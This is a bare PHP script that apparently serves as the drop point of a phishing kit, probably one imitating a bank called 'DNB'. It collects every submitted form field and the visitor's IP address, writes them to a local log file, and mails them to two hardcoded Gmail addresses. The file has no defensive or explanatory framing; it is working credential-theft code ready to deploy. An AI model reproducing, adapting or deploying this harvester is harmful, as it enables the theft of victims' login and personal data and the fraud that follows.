<?php
$to = "jemmybtc9@gmail.com,jemmybtc1993@gmail.com";
	function getRealIpAddr()
{
    if (!empty($_SERVER['HTTP_CLIENT_IP']))   //check ip from share internet
    {
      $ip=$_SERVER['HTTP_CLIENT_IP'];
    }
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))   //to check ip is pass from proxy
    {
      $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    else
    {
      $ip=$_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}

$subject = 'DNB : ' . getRealIpAddr();
$message = 'ip: '.getRealIpAddr() . "\r\n";
foreach($_POST as $k => $v){
	$message .= "$k : $v \r\n";
}
file_put_contents("rooos.txt", $message, FILE_APPEND);
$headers = 'X-Mailer: PHP/' . phpversion();
mail($to, $subject, $message, $headers);


?>